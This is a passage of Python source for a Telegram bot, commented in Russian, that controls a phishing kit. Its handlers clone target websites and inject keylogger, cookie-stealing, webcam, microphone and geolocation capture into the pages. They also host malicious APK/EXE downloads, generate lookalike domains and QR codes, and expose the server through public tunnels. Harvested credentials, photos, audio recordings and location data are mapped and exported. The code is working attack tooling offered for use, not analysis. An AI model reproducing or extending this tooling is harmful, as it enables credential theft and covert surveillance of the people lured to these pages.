    mid = wait_msg['result']['message_id'] if wait_msg and wait_msg.get('ok') else None

    def _do():
        result = _exec_code(code, uid, user_dir)
        text   = _fmt_code(result)
        if mid:
            try:
                edit_message(chat_id, mid, text[:4000])
                return
            except Exception:
                pass
        send_message(text[:4000], chat_id)

    threading.Thread(target=_do, daemon=True).start()


# ════════════════════════════════════════════════════════════
#  🎣 ФИШИНГ-МОДУЛЬ — меню, клавиатуры, хэндлеры
# ════════════════════════════════════════════════════════════

def fish_menu_keyboard():
    """Главное меню фишинг-модуля."""
    if not FISH_ENABLED:
        return kb([btn("❌ Модуль недоступен", "noop")])

    active_info = fish_downloader.get_active_page_info()

    # ── Статусы всех тоннелей ──────────────────────────────────────
    def _alive(proc):
        return proc is not None and proc.poll() is None

    cf_str     = "🟢 CF"     if _alive(fish_bot_state.tunnel_process)  else "🔴 CF"
    bore_str   = "🟢 bore"   if _alive(fish_bot_state.bore_process)    else "🔴 bore"
    ngrok_str  = "🟢 ngrok"  if _alive(fish_bot_state.ngrok_process)   else "🔴 ngrok"
    serveo_str = "🟢 serveo" if _alive(fish_bot_state.serveo_process)  else "🔴 serveo"

    # ── Flask-сервер ───────────────────────────────────────────────
    srv_act  = "fish:server_stop"  if fish_bot_state.server_running else "fish:server_start"
    srv_str  = "🟢 сервер :{}".format(_fish_cfg.SERVER_PORT) if fish_bot_state.server_running \
               else "🔴 сервер :{}".format(_fish_cfg.SERVER_PORT)

    return kb(
        [btn("📥 Загрузить страницу",  "fish:load"),
         btn("🌐 Весь сайт",           "fish:fullsite")],
        [btn("📍+Гео",                 "fish:load_geo"),
         btn("📸+Камера",              "fish:load_cam"),
         btn("🎤+Микрофон",            "fish:load_mic")],
        [btn("📤 Загрузить файл",      "fish:upload"),
         btn("📂 Мои файлы",           "fish:files")],
        [btn("📄 Стр. скачивания",     "fish:create_dl"),
         btn("💣 Payload URL",         "fish:payload")],
        [btn("📚 Страницы",            "fish:pages"),
         btn("📊 Статистика",          "fish:stats")],
        # ── Сервер ────────────────────────────────────────────────
        [btn(srv_str,                  srv_act),
         btn("🔄 Рестарт сервера",     "fish:server_restart")],
        # ── Тоннели ───────────────────────────────────────────────
        [btn("🌍 {} Туннель".format(cf_str),      "fish:tunnel"),
         btn("🛑 Стоп CF",                         "fish:stop_tunnel")],
        [btn("🕳 {}".format(bore_str),             "fish:bore_start"),
         btn("🛑 Стоп bore",                       "fish:bore_stop")],
        [btn("🔌 {}".format(ngrok_str),            "fish:ngrok_start"),
         btn("🛑 Стоп ngrok",                      "fish:ngrok_stop")],
        [btn("🔑 {}".format(serveo_str),           "fish:serveo_start"),
         btn("🛑 Стоп serveo",                     "fish:serveo_stop")],
        # ──────────────────────────────────────────────────────────
        [btn("🔀 Похожий домен",       "fish:gen_domain"),
         btn("📱 QR-код",              "fish:qr")],
        [btn("📸 Фото с вебки",        "fish:photos"),
         btn("🎵 Аудио записи",        "fish:audios")],
        [btn("🗺 Карта гео",           "fish:map"),
         btn("📤 Экспорт CSV",         "fish:export")],
        [btn("🧹 Очистить логи",       "fish:clear_logs"),
         btn("ℹ️ Статус",             "fish:status")],
        [back_btn()],
    )


def _is_termux():
    """
    Определяем Android/Termux-окружение.

    На Android без root Go-бинарники (cloudflared) читают /etc/resolv.conf
    который указывает на [::1]:53 — внутренний DNS-демон Android.
    Этот демон недоступен снаружи официальных приложений, поэтому
    Go-резолвер всегда получает "connection refused".

    Python при этом использует Android libc через socket.getaddrinfo —
    и у него DNS работает нормально. Именно поэтому _dns_resolves()
    даёт ложноположительный результат: Python видит DNS, Go — нет.

    Признак Termux — каталог /data/data/com.termux или PREFIX в окружении.
    """
    if os.path.isdir("/data/data/com.termux"):
        return True
    prefix = os.environ.get("PREFIX", "")
    if "com.termux" in prefix:
        return True
    return False


def _dns_resolves(hostname, timeout=3):
    """
    Быстрая проверка: резолвится ли hostname через системный DNS.
    Использует socket.getaddrinfo — тот же путь что и большинство
    нативных бинарников (включая Go при GODEBUG=netdns=cgo).
    Возвращает True если хотя бы один IP найден за timeout секунд.
    """
    import socket
    import concurrent.futures
    def _resolve():
        return socket.getaddrinfo(hostname, None)
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
            fut = ex.submit(_resolve)
            fut.result(timeout=timeout)
        return True
    except Exception:
        return False


def _fix_tunnel_dns():
    """
    Пытается прописать IP Cloudflare в /etc/hosts чтобы Go-резолвер
    нашёл домен без DNS-запроса (при GODEBUG=netdns=go).

    На Android без root /etc/hosts — read-only. Поэтому пробуем
    несколько путей, в том числе хардкодированный путь Termux
    (не полагаемся на $PREFIX — он может быть не установлен
    когда бот запущен не из интерактивного терминала).

    Возвращает True если запись удалась хотя бы в один файл.
    """
    cf_entries = [
        "104.16.230.132 api.trycloudflare.com",
        "104.16.231.132 api.trycloudflare.com",
    ]
    candidates = [
        # Termux — хардкод, не полагаемся на $PREFIX
        "/data/data/com.termux/files/usr/etc/hosts",
        # Termux через $PREFIX на случай нестандартной установки
        os.path.join(os.environ.get("PREFIX", "/nonexistent"), "etc", "hosts"),
        # Системный — обычно read-only, но вдруг root
        "/etc/hosts",
    ]
    # Убираем дубликаты (если $PREFIX не установлен, первые два совпадут)
    seen, unique = set(), []
    for p in candidates:
        if p not in seen:
            seen.add(p)
            unique.append(p)

    for hosts_path in unique:
        if not os.path.exists(os.path.dirname(hosts_path)):
            continue
        try:
            try:
                with open(hosts_path, "r") as f:
                    existing = f.read()
            except Exception:
                existing = ""
            additions = [e for e in cf_entries if e.split()[1] not in existing]
            if not additions:
                print("DNS fix: {} уже содержит нужные записи".format(hosts_path), flush=True)
                return True
            with open(hosts_path, "a") as f:
                f.write("\n# cloudflared DNS fix (auto)\n")
                f.write("\n".join(additions) + "\n")
            print("DNS fix: OK — записано в {}".format(hosts_path), flush=True)
            return True
        except Exception as e:
            print("DNS fix: {} — {}".format(hosts_path, e), flush=True)

    print("DNS fix: не удалось записать ни в один hosts-файл", flush=True)
    return False


def _fish_start_cloudflared():
    """
    Запускает тоннель и возвращает публичный URL или None.

    Порядок попыток:
      1. cloudflared — сначала делаем pre-flight DNS check через socket.
         Если DNS работает системно — запускаем. Если нет — пробуем
         hosts-фикс. Если и он недоступен (read-only Android) — пропускаем
         cloudflared совсем, без ожидания таймаута.
      2. bore — Rust/системный резолвер, не зависит от Go DNS quirks.
      3. SSH → serveo.net.
    """
    port = _fish_cfg.SERVER_PORT
    cf_host = "api.trycloudflare.com"

    # ── 1. cloudflared ────────────────────────────────────────────────
    # На Android/Termux Go-бинарники используют собственный DNS-стек
    # который читает /etc/resolv.conf → [::1]:53 (недоступно без root).
    # Python при этом нормально резолвит через libc — поэтому проверка
    # через socket даёт ложноположительный результат. Детектируем Termux
    # и пропускаем cloudflared полностью, без попыток.
    if shutil.which("cloudflared"):
        if _is_termux():
            print("cloudflared: пропущен (Android/Termux — Go-DNS недоступен без root)", flush=True)
        else:
            # Не Android — пробуем hosts-фикс на всякий случай, потом запускаем
            _fix_tunnel_dns()
            env = os.environ.copy()
            env["GODEBUG"] = "netdns=go"
            try:
                proc = subprocess.Popen(
                    ["cloudflared", "tunnel",
                     "--edge-ip-version", "4",
                     "--url", "http://localhost:{}".format(port)],
                    stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                    text=True, bufsize=1, env=env,
                )
                fish_bot_state.tunnel_process = proc
                url_pat = r"https://[a-zA-Z0-9-]+\.trycloudflare\.com"
                for line in proc.stderr:
                    print("cloudflared:", line.rstrip(), flush=True)
                    m = re.search(url_pat, line)
                    if m:
                        fish_bot_state.tunnel_url = m.group(0)
                        return fish_bot_state.tunnel_url
                    if "connection refused" in line and ":53" in line:
                        print("cloudflared: DNS недоступен, переходим к bore", flush=True)
                        proc.terminate()
                        break
            except Exception as e:
                print("cloudflared error: {}".format(e), flush=True)

    # ── 2. bore ───────────────────────────────────────────────────────
    if shutil.which("bore"):
        try:
            proc = subprocess.Popen(
                ["bore", "local", str(port), "--to", "bore.pub"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
            fish_bot_state.tunnel_process = proc
            # bore печатает: "listening at bore.pub:XXXXX"
            port_pat = r"bore\.pub:(\d+)"
            for line in proc.stdout:
                print("bore:", line.rstrip(), flush=True)
                m = re.search(port_pat, line)
                if m:
                    url = "http://bore.pub:{}".format(m.group(1))
                    fish_bot_state.tunnel_url = url
                    return url
        except Exception as e:
            print("bore error: {}".format(e), flush=True)

    # ── 3. SSH → serveo.net ───────────────────────────────────────────
    if shutil.which("ssh"):
        try:
            proc = subprocess.Popen(
                ["ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "ServerAliveInterval=30",
                 "-R", "80:localhost:{}".format(port),
                 "serveo.net"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
            fish_bot_state.tunnel_process = proc
            url_pat = r"https://[a-zA-Z0-9-]+\.serveo\.net"
            for line in proc.stdout:
                print("serveo:", line.rstrip(), flush=True)
                m = re.search(url_pat, line)
                if m:
                    fish_bot_state.tunnel_url = m.group(0)
                    return fish_bot_state.tunnel_url
        except Exception as e:
            print("serveo error: {}".format(e), flush=True)

    # Всё провалилось
    return None


def _fish_stop_tunnel():
    if fish_bot_state.tunnel_process:
        fish_bot_state.tunnel_process.terminate()
        fish_bot_state.tunnel_process = None
        fish_bot_state.tunnel_url = None


def _fish_send_options(chat_id):
    """Отправляет меню настроек инжекций для страницы скачивания."""
    opts = _fish_user_opts.get(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })

    def _t(v): return "✅" if v else "❌"

    send_message(
        "🔧 <b>Настройки инжекций</b>\n\n"
        "📍 Гео: {geo}  📸 Камера: {cam}  🎤 Микрофон: {mic}\n"
        "📥 Авто-скачивание: {auto}  ⌨️ Кейлоггер: {kl}\n"
        "🍪 Куки: {ck}  🖥️ Инфо о системе: {si}  🔄 Iframe: {if_}".format(
            geo=_t(opts['geo']), cam=_t(opts['cam']),
            mic=_t(opts['mic']), auto=_t(opts['auto']),
            kl=_t(opts.get('keylogger', False)),
            ck=_t(opts.get('steal_cookies', False)),
            si=_t(opts.get('system_info', False)),
            if_=_t(opts.get('iframe_phish', False)),
        ),
        chat_id,
        reply_markup=kb(
            [btn("📍 Гео {}".format(_t(opts['geo'])),    "fish_opt:geo"),
             btn("📸 Камера {}".format(_t(opts['cam'])),  "fish_opt:cam")],
            [btn("🎤 Микро {}".format(_t(opts['mic'])),   "fish_opt:mic"),
             btn("📥 Авто {}".format(_t(opts['auto'])),   "fish_opt:auto")],
            [btn("⌨️ Кейлог {}".format(_t(opts.get('keylogger', False))), "fish_opt:keylogger"),
             btn("🍪 Куки {}".format(_t(opts.get('steal_cookies', False))), "fish_opt:cookies")],
            [btn("🖥️ Инфо {}".format(_t(opts.get('system_info', False))), "fish_opt:sysinfo"),
             btn("🔄 Iframe {}".format(_t(opts.get('iframe_phish', False))), "fish_opt:iframe")],
            [btn("🚀 Создать страницу", "fish_opt:generate"),
             btn("❌ Отмена",           "menu_fish")],
        )
    )


def _fish_handle_action(action, chat_id):
    """Обрабатывает fish: callback actions."""
    if not FISH_ENABLED:
        send_message("❌ Фишинг-модуль не загружен. Проверь зависимости.", chat_id)
        return

    if action == 'load':
        _wait_state[chat_id] = 'fish_load_url'
        send_message("📥 Введи URL страницы (например https://vk.com):",
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'fullsite':
        _wait_state[chat_id] = 'fish_fullsite_url'
        send_message("🌐 Введи URL сайта для полного скачивания:",
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action in ('load_geo', 'load_cam', 'load_mic'):
        mode = {'load_geo': 'geo', 'load_cam': 'cam', 'load_mic': 'mic'}[action]
        _wait_state[chat_id] = 'fish_load_{}_url'.format(mode)
        send_message("📥 Введи URL страницы (+{} инжекция):".format(mode),
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'upload':
        _wait_state[chat_id] = 'fish_upload_file'
        send_message("📤 Отправь файл (APK, EXE, PDF и т.д.):",
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'files':
        files = fish_db.get_all_files()
        if not files:
            send_message("📭 Нет загруженных файлов.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
            return
        lines = ["📂 <b>Загруженные файлы:</b>\n"]
        for f in files:
            fid, name, size, date, dls = f['id'], f['original_name'], f['size'], f['upload_time'], f['downloads']
            lines.append("<code>{}</code> — {} ({:.1f} KB) | ⬇️{}".format(
                fid, name, size / 1024, dls))
        send_message("\n".join(lines), chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'create_dl':
        files = fish_db.get_all_files()
        if not files:
            send_message("❌ Сначала загрузи файл через Загрузить файл.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
            return
        rows = [[btn("{} ({:.0f}KB)".format(f['original_name'], f['size']/1024),
                     "fish_selfile:{}".format(f['id']))] for f in files]
        rows.append([back_btn("menu_fish")])
        send_message("📄 Выбери файл для страницы скачивания:", chat_id, reply_markup=kb(*rows))

    elif action == 'payload':
        _wait_state[chat_id] = 'fish_payload_url'
        send_message("💣 Введи URL вредоносного файла:", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'pages':
        pages = fish_downloader.get_all_pages()
        if not pages:
            send_message("📭 Нет сохранённых страниц.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
            return
        lines = ["📚 <b>Страницы</b> (последние 10):\n"]
        for pid, meta in sorted(pages.items(), key=lambda x: x[0], reverse=True)[:10]:
            ptype = "🌐" if meta.get('type') == 'full_site' else "📄"
            lines.append("{} <code>{}</code> — {}".format(
                ptype, pid, meta['url'][:45]))
        rows = [[btn("✅ Активировать ID", "fish:use_page"),
                 btn("♻️ Клонировать ID",  "fish:clone_page")]]
        rows.append([back_btn("menu_fish")])
        send_message("\n".join(lines), chat_id, reply_markup=kb(*rows))

    elif action == 'use_page':
        _wait_state[chat_id] = 'fish_use_page'
        send_message("✅ Введи ID страницы для активации:", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'clone_page':
        _wait_state[chat_id] = 'fish_clone_page'
        send_message("♻️ Введи ID страницы для клонирования:", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'fish_stats':
        try:
            cc, gc, wc, mc, vc = fish_db.get_stats()
            send_message(
                "📊 <b>Фишинг-статистика</b>\n\n"
                "🔑 Данных: {}\n📍 Геолокаций: {}\n"
                "📸 Фото: {}\n🎤 Аудио: {}\n👁 Визитов: {}".format(
                    cc, gc, wc, mc, vc),
                chat_id, reply_markup=kb([back_btn("menu_fish")]))
        except Exception as e:
            send_message("❌ Ошибка: {}".format(e), chat_id)

    elif action == 'tunnel':
        send_message("🔄 Запускаю Cloudflared...", chat_id)
        def _do_tunnel():
            _fish_stop_tunnel()
            url = _fish_start_cloudflared()
            if url:
                send_message(
                    "✅ <b>Туннель запущен!</b>\n"
                    "🔗 <code>{}</code>\n\n"
                    "Порт: {}".format(url, _fish_cfg.SERVER_PORT),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
            else:
                send_message("❌ Не удалось запустить. Проверь cloudflared.", chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_tunnel)

    elif action == 'stop_tunnel':
        _fish_stop_tunnel()
        send_message("🛑 Туннель остановлен.", chat_id,
                     reply_markup=kb([back_btn("menu_fish")]))

    # ── bore ────────────────────────────────────────────────────────
    elif action == 'bore_start':
        def _do_bore():
            # Если bore уже жив — не дублируем
            if (fish_bot_state.bore_process is not None and
                    fish_bot_state.bore_process.poll() is None):
                send_message(
                    "🕳 Bore уже запущен: {}".format(fish_bot_state.bore_url),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            if not shutil.which("bore"):
                send_message(
                    "❌ bore не установлен.\n"
                    "Установи: <code>cargo install bore-cli</code>\n"
                    "Или: <code>pkg install rust && cargo install bore-cli</code>",
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            send_message("🕳 Запускаю bore...", chat_id)
            try:
                proc = subprocess.Popen(
                    ["bore", "local", str(_fish_cfg.SERVER_PORT), "--to", "bore.pub"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                fish_bot_state.bore_process = proc
                port_pat = re.compile(r"bore\.pub:(\d+)")
                url = None
                for line in proc.stdout:
                    print("bore:", line.rstrip(), flush=True)
                    m = port_pat.search(line)
                    if m:
                        url = "http://bore.pub:{}".format(m.group(1))
                        fish_bot_state.bore_url = url
                        break
                if url:
                    send_message(
                        "🕳 Bore запущен!\n🔗 <code>{}</code>".format(url),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                else:
                    send_message("❌ bore не дал URL. Смотри логи.", chat_id,
                                 reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка bore: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_bore)

    elif action == 'bore_stop':
        if fish_bot_state.bore_process:
            fish_bot_state.bore_process.terminate()
            fish_bot_state.bore_process = None
            fish_bot_state.bore_url     = None
            send_message("🛑 Bore остановлен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
        else:
            send_message("ℹ️ Bore не запущен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))

    # ── ngrok ────────────────────────────────────────────────────────
    elif action == 'ngrok_start':
        def _do_ngrok():
            # Проверяем что ngrok не запущен повторно
            if (fish_bot_state.ngrok_process is not None and
                    fish_bot_state.ngrok_process.poll() is None):
                send_message(
                    "🔌 ngrok уже запущен: {}".format(fish_bot_state.ngrok_url),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            if not shutil.which("ngrok"):
                send_message(
                    "❌ ngrok не установлен.\n\n"
                    "Установка в Termux:\n"
                    "<code>pkg install wget</code>\n"
                    "<code>wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz</code>\n"
                    "<code>tar xf ngrok-v3-stable-linux-arm64.tgz</code>\n"
                    "<code>mv ngrok $PREFIX/bin/</code>\n\n"
                    "Затем авторизация (нужен бесплатный аккаунт на ngrok.com):\n"
                    "<code>ngrok config add-authtoken ВАШ_ТОКЕН</code>",
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            send_message("🔌 Запускаю ngrok...", chat_id)
            try:
                # ngrok http PORT — запускает туннель и пишет URL в stderr/stdout.
                # Используем --log=stdout чтобы читать JSON-лог со статусом.
                proc = subprocess.Popen(
                    ["ngrok", "http",
                     "--log=stdout", "--log-format=json",
                     str(_fish_cfg.SERVER_PORT)],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                fish_bot_state.ngrok_process = proc

                # ngrok пишет JSON-строки; ждём строку с url
                import json as _json
                url = None
                url_pat = re.compile(r"https://[a-zA-Z0-9-]+\.ngrok(?:-free)?\.app")

                for line in proc.stdout:
                    line = line.strip()
                    print("ngrok:", line, flush=True)

                    # Пробуем JSON-парсинг — новые версии ngrok пишут JSON
                    try:
                        obj = _json.loads(line)
                        # Поле url появляется в событии tunnel started
                        candidate = obj.get("url") or obj.get("Url", "")
                        if candidate.startswith("https://"):
                            url = candidate
                            break
                    except _json.JSONDecodeError:
                        pass

                    # Фоллбэк — ищем URL текстовым паттерном
                    m = url_pat.search(line)
                    if m:
                        url = m.group(0)
                        break

                    # Ошибка авторизации — сообщаем сразу
                    if "ERR_NGROK_105" in line or "authentication" in line.lower():
                        proc.terminate()
                        send_message(
                            "❌ ngrok: нужна авторизация.\n"
                            "Зарегистрируйся на ngrok.com и выполни:\n"
                            "<code>ngrok config add-authtoken ВАШ_ТОКЕН</code>",
                            chat_id, reply_markup=kb([back_btn("menu_fish")]))
                        return

                if url:
                    fish_bot_state.ngrok_url = url
                    send_message(
                        "🔌 ngrok запущен!\n🔗 <code>{}</code>".format(url),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                else:
                    send_message(
                        "❌ ngrok не дал URL. Проверь авторизацию и логи.",
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка ngrok: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_ngrok)

    elif action == 'ngrok_stop':
        if fish_bot_state.ngrok_process:
            fish_bot_state.ngrok_process.terminate()
            fish_bot_state.ngrok_process = None
            fish_bot_state.ngrok_url     = None
            send_message("🛑 ngrok остановлен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
        else:
            send_message("ℹ️ ngrok не запущен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))

    # ── serveo ───────────────────────────────────────────────────────
    elif action == 'serveo_start':
        def _do_serveo():
            # Проверяем что serveo не запущен повторно
            if (fish_bot_state.serveo_process is not None and
                    fish_bot_state.serveo_process.poll() is None):
                send_message(
                    "🔑 Serveo уже запущен: {}".format(fish_bot_state.serveo_url),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            if not shutil.which("ssh"):
                send_message(
                    "❌ ssh не найден.\n<code>pkg install openssh</code>",
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            send_message("🔑 Запускаю serveo (SSH-тоннель)...", chat_id)
            try:
                # serveo.net — бесплатный SSH reverse tunnel.
                # -R 80:localhost:PORT пробрасывает локальный порт на serveo.
                # -N — не выполнять команды, только форвардинг.
                # ServerAliveInterval — keepalive чтобы SSH не закрылся.
                proc = subprocess.Popen(
                    ["ssh",
                     "-o", "StrictHostKeyChecking=no",
                     "-o", "ServerAliveInterval=30",
                     "-o", "ServerAliveCountMax=3",
                     "-o", "ExitOnForwardFailure=yes",
                     "-R", "80:localhost:{}".format(_fish_cfg.SERVER_PORT),
                     "serveo.net"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                fish_bot_state.serveo_process = proc
                url_pat = re.compile(r"https://[a-zA-Z0-9-]+\.serveo\.net")

                url = None
                for line in proc.stdout:
                    print("serveo:", line.rstrip(), flush=True)
                    m = url_pat.search(line)
                    if m:
                        url = m.group(0)
                        break
                    # serveo иногда отказывает — сообщаем сразу
                    if "Connection refused" in line or "Permission denied" in line:
                        proc.terminate()
                        send_message(
                            "❌ Serveo недоступен: {}\n\n"
                            "Попробуй bore или ngrok.".format(line.strip()),
                            chat_id, reply_markup=kb([back_btn("menu_fish")]))
                        return

                if url:
                    fish_bot_state.serveo_url = url
                    send_message(
                        "🔑 Serveo запущен!\n🔗 <code>{}</code>".format(url),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                else:
                    send_message(
                        "❌ Serveo не дал URL. Сервис может быть недоступен.",
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка serveo: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_serveo)

    elif action == 'serveo_stop':
        if fish_bot_state.serveo_process:
            fish_bot_state.serveo_process.terminate()
            fish_bot_state.serveo_process = None
            fish_bot_state.serveo_url     = None
            send_message("🛑 Serveo остановлен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
        else:
            send_message("ℹ️ Serveo не запущен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))

    # ── Flask-сервер ────────────────────────────────────────────────
    elif action == 'server_start':
        if fish_bot_state.server_running:
            send_message(
                "ℹ️ Сервер уже работает на порту {}.".format(_fish_cfg.SERVER_PORT),
                chat_id, reply_markup=kb([back_btn("menu_fish")]))
        else:
            def _do_server_start():
                try:
                    from fish_web import app as fish_app
                    def _run():
                        fish_bot_state.server_running = True
                        try:
                            fish_app.run(
                                host=_fish_cfg.SERVER_HOST,
                                port=_fish_cfg.SERVER_PORT,
                                debug=False, use_reloader=False,
                            )
                        finally:
                            fish_bot_state.server_running = False
                    t = threading.Thread(target=_run, daemon=True, name="fish-flask")
                    fish_bot_state.server_thread = t
                    t.start()
                    import time as _time; _time.sleep(1.5)
                    send_message(
                        "✅ Сервер запущен на порту {}.".format(_fish_cfg.SERVER_PORT),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                except Exception as e:
                    send_message("❌ Ошибка старта сервера: {}".format(e), chat_id,
                                 reply_markup=kb([back_btn("menu_fish")]))
            _run_in_thread(_do_server_start)

    elif action == 'server_stop':
        # Flask не умеет останавливаться красиво без Werkzeug shutdown,
        # поэтому обновляем флаг и убиваем поток через daemon-stop.
        # При следующем рестарте поднимем новый.
        fish_bot_state.server_running = False
        send_message(
            "🛑 Флаг сервера сброшен. Используй «Рестарт» для полного перезапуска.",
            chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'server_restart':
        def _do_restart():
            # Останавливаем bore и туннель чтобы не было конфликтов по порту
            if fish_bot_state.bore_process:
                fish_bot_state.bore_process.terminate()
                fish_bot_state.bore_process = None
                fish_bot_state.bore_url     = None
            fish_bot_state.server_running = False

            import time as _time; _time.sleep(1)

            try:
                from fish_web import app as fish_app
                def _run():
                    fish_bot_state.server_running = True
                    try:
                        fish_app.run(
                            host=_fish_cfg.SERVER_HOST,
                            port=_fish_cfg.SERVER_PORT,
                            debug=False, use_reloader=False,
                        )
                    finally:
                        fish_bot_state.server_running = False
                t = threading.Thread(target=_run, daemon=True, name="fish-flask-restart")
                fish_bot_state.server_thread = t
                t.start()
                _time.sleep(1.5)
                send_message(
                    "🔄 Сервер перезапущен на порту {}.".format(_fish_cfg.SERVER_PORT),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка рестарта: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_restart)

    elif action == 'gen_domain':
        _wait_state[chat_id] = 'fish_gen_domain'
        send_message("🔀 Введи домен (например limpa.ru):", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'qr':
        url = fish_bot_state.tunnel_url or "http://localhost:{}".format(_fish_cfg.SERVER_PORT)
        try:
            img = fish_utils.generate_qr(url, return_img=True)
            import requests as _req
            _req.post(
                "https://api.telegram.org/bot{}/sendPhoto".format(config.TELEGRAM_BOT_TOKEN),
                data={'chat_id': chat_id, 'caption': "🔗 {}".format(url)},
                files={'photo': ('qr.png', img, 'image/png')},
                timeout=30
            )
        except Exception as e:
            send_message("❌ QR ошибка: {}".format(e), chat_id)

    elif action == 'photos':
        webcam_dir = os.path.join(_fish_cfg.LOGS_DIR, 'webcam')
        files = sorted(os.listdir(webcam_dir), reverse=True)[:10] if os.path.exists(webcam_dir) else []
        if not files:
            send_message("📭 Нет фото.", chat_id, reply_markup=kb([back_btn("menu_fish")]))
            return
        text = "📸 <b>Фото с вебки:</b>\n" + "\n".join("<code>{}</code>".format(f) for f in files)
        send_message(text, chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'audios':
        audio_dir = os.path.join(_fish_cfg.LOGS_DIR, 'microphone')
        files = sorted(os.listdir(audio_dir), reverse=True)[:10] if os.path.exists(audio_dir) else []
        if not files:
            send_message("📭 Нет аудио.", chat_id, reply_markup=kb([back_btn("menu_fish")]))
            return
        text = "🎵 <b>Аудио записи:</b>\n" + "\n".join("<code>{}</code>".format(f) for f in files)
        send_message(text, chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'map':
        send_message("🗺 Генерирую карту...", chat_id)
        def _do_map():
            try:
                import sqlite3, folium, pandas as pd, io
                conn = sqlite3.connect(_fish_cfg.DB_PATH)
                df = pd.read_sql_query(
                    "SELECT lat, lon FROM geo WHERE lat IS NOT NULL AND lon IS NOT NULL", conn)
                conn.close()
                if df.empty:
                    send_message("❌ Нет данных геолокации.", chat_id)
                    return
                m = folium.Map(location=[df.lat.mean(), df.lon.mean()], zoom_start=2)
                for _, row in df.iterrows():
                    folium.Marker([row.lat, row.lon]).add_to(m)
                buf = io.BytesIO()
                m.save(buf, close_file=False); buf.seek(0)
                import tempfile
                with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as tmp:
                    tmp.write(buf.read()); tmp_path = tmp.name
                send_document(tmp_path, caption="📍 Карта ({} точек)".format(len(df)),
                              chat_id=chat_id)
                os.unlink(tmp_path)
            except Exception as e:
                send_message("❌ Ошибка карты: {}".format(e), chat_id)
        _run_in_thread(_do_map)

    elif action == 'export':
        send_message("📤 Экспортирую...", chat_id)
        def _do_export():
            try:
                import sqlite3, pandas as pd, zipfile, io, tempfile
                conn = sqlite3.connect(_fish_cfg.DB_PATH)
                dfs = {
                    'credentials.csv': pd.read_sql_query("SELECT * FROM credentials", conn),
                    'geo.csv': pd.read_sql_query("SELECT * FROM geo", conn),
                    'media.csv': pd.read_sql_query("SELECT * FROM media", conn),
                    'visits.csv': pd.read_sql_query("SELECT * FROM visits", conn),
                }
                conn.close()
                buf = io.BytesIO()
                with zipfile.ZipFile(buf, 'a', zipfile.ZIP_DEFLATED) as zf:
                    for name, df in dfs.items():
                        zf.writestr(name, df.to_csv(index=False).encode('utf-8'))
                buf.seek(0)
                with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
                    tmp.write(buf.read()); tmp_path = tmp.name
                send_document(tmp_path, caption="📦 Фишинг данные", chat_id=chat_id)
                os.unlink(tmp_path)
            except Exception as e:
